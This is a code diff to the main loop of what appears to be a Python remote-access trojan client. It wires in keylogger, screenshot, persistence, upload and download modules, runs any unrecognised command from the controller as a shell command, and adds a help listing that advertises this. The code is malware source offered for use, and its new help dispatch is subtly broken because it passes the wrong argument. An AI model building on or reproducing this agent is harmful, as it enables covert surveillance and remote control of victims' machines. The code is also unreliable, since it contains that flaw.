@@ -4,14 +4,40 @@ import time
 import os
 import requests
 import sys
+import pkgutil
 
 import settings
+import utils
 from modules import runcmd
 from modules import persistence
 from modules import download
 from modules import upload
 from modules import keylogger
 from modules import screenshot
+
+
+def print_help(mod=None):
+    help_text = """
+    Loaded modules:
+
+    """
+    if mod:
+        help_text += "- " + mod + "\n"
+        help_text += sys.modules["modules.%s" % mod].help()
+    else:
+        for _, module, _ in pkgutil.iter_modules(['modules']):
+            help_text += "- " + module + "\n"
+            help_text += sys.modules["modules.%s" % module].help()
+    help_text += """
+
+    General commands:
+
+    - cd path/to/dir : changes directory
+    - help : display this text
+    - [any other command] : execute shell command
+
+    """
+    utils.send_output(help_text)
 
 
 if __name__ == "__main__":
@@ -27,9 +53,14 @@ if __name__ == "__main__":
                 if settings.DEBUG:
                     print command
                 if cmdargs[0] == "cd":
-                    os.chdir(" ".join(cmdargs[1:]))
-                if "modules.%s" % cmdargs[0] in sys.modules:
+                    os.chdir(os.path.expandvars(" ".join(cmdargs[1:])))
+                elif "modules.%s" % cmdargs[0] in sys.modules:
                     sys.modules["modules.%s" % cmdargs[0]].run(*cmdargs[1:])
+                elif cmdargs[0] == "help":
+                    if len(cmdargs) > 1:
+                        print_help(cmdargs[0])
+                    else:
+                        print_help()
                 else:
                     runcmd.run(command)
                 last_active = time.time()
